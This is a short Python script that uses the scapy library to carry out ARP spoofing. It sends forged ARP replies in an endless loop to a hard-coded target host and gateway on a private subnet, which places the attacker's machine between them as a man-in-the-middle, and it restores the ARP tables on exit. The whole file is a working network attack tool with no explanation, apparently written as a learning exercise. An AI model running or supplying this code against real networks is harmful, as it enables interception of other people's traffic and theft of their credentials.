#!/usr/bin/env python

import subprocess
import scapy.all as scapy
import time

def scan(target_ip):
    arp_request = scapy.ARP(pdst = target_ip)
    broadcast = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered = scapy.srp(arp_request_broadcast, timeout = 1, verbose = False)[0]
    return answered[0][1].hwsrc

def arpspoof(target_ip, gateway_ip):
	target_mac = scan(target_ip)
	packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = target_mac, psrc = gateway_ip)
	scapy.send(packet, verbose = False)

def restore(target_ip, gateway_ip):
	target_mac = scan(target_ip)
	gateway_mac = scan(gateway_ip)
	packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = target_mac, psrc = gateway_ip, hwsrc = gateway_mac)
	scapy.send(packet, verbose = False)

count = 2
try:
	while True:
		arpspoof("192.168.92.134", "192.168.92.2")
		arpspoof("192.168.92.2", "192.168.92.134")
		print("\r[+] packets sent = " + str(count), end = "")
		count += 2
		time.sleep(2)
except:
	KeyboardInterrupt
	print("\nExiting..")
	restore("192.168.92.134", "192.168.92.2")